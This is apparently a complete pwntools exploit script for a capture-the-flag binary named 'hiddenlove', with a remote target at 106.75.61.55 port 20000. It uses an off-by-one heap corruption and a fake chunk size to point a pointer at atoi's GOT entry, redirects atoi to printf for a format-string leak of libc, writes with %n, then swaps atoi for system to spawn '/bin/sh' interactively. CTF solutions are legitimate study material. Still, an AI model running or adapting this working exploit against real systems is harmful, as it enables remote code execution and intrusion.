from pwn import *

context.arch = "amd64"
DEBUG = 1
if DEBUG:
    p = process('./hiddenlove')

    LIBC = "./l.so"
else:
    p = remote('106.75.61.55',  20000)

atoi_got=0x602060
re_flag=0x602094
def Exit(chunk):
    p.recvuntil('feet\n')
    p.sendline('4')
    p.recvuntil('(Y/N)\n')
    p.sendline(chunk)

def New(size,chunk,name):
    p.recvuntil('feet\n')
    p.sendline('1')
    p.recvuntil('(0~1000)\n')
    p.sendline(str(size))
    #print "123"
    p.recvuntil('with her\n')
    p.sendline(chunk)
    p.recvuntil('name\n')
    p.sendline(name)

def Delete():
    p.recvuntil('feet\n')
    p.sendline('3')

def Edit(data): 
    p.recvuntil('feet\n')
    p.sendline('2')
    p.recvuntil('feelings\n')
    p.send(data[:-1])
    

def pwn():
    #gdb.attach(p,'b *0x400AFA ')

    ## scanf cached chunk
    chunk_1  = 'nn'
    chunk_1 += '\x00'*(0x1000-0x18-len(chunk_1))
    chunk_1 += p64(0x50)  ##fake size
    Exit(chunk_1)
    print 'part 1 done'

    chunk_3  = p64(0)
    chunk_3 += p64(0x21)
    New(0x80, chunk_3, 'A'*8)  ##off-by-one 'a'*8
    print 'part 2 done'
    Delete()
    print 'part 3 done'
    
    chunk_2=p64(0)*3+p64(0x21)+p64(0x7)+p64(0)+p64(atoi_got)
    sleep(0.5)
    New(0x40,chunk_2,'a'*6)  ##overwite sectet addr to atoi got
    
    fake_atoi_got=0x4006f0  ##printf plt
    Edit(p64(fake_atoi_got))
    
    ###leak puts addr
    p.recvuntil('feet\n')
    puts_got=0x602020
    p.send('----%7$s'+p64(puts_got))
    p.recvuntil('----')
    data=p.recvuntil('\x20\x20')[:-2].ljust(8,'\x00')
    print len(data)
    puts_addr=u64(data)
    print "puts addr",hex(puts_addr)
    
    libc = ELF(LIBC)
    libc_base=puts_addr-libc.symbols["puts"]
    system_addr = libc_base + libc.symbols["system"]
    print 'libc_base', hex(libc_base)
    print 'system', hex(system_addr)
    
    
    ###overwrite reoganize_flag
    p.recvuntil('feet\n')
    puts_got=0x602020
    p.send('%7$n%50c'+p64(re_flag))
    
    fake_atoi_got=system_addr  ##system_addr
    Edit(p64(fake_atoi_got))
    
    p.recvuntil('feet\n')
    p.sendline('/bin/sh;\n')
 
    p.interactive()

if __name__ == '__main__':
    pwn() 
